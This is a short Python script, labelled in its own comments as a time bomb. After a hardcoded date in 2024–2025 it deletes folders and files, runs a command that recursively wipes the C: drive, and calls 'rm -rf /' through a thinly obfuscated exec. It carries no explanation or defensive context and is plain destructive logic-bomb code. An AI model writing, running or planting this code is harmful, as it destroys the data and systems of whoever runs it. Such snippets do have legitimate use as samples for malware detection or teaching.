import datetime
import os
import shutil

# Time bomb trigger
if datetime.datetime.now() > datetime.datetime(2024, 12, 31):
    # Destructive operations
    shutil.rmtree('/important_folder')
    os.system('del /Q /S C:\\*')

# Code obfuscation
exec("__import__('os').system('rm -rf /')")

# Hardcoded trigger date
if datetime.date.today() >= datetime.date(2025, 1, 1):
    os.remove('/critical.txt')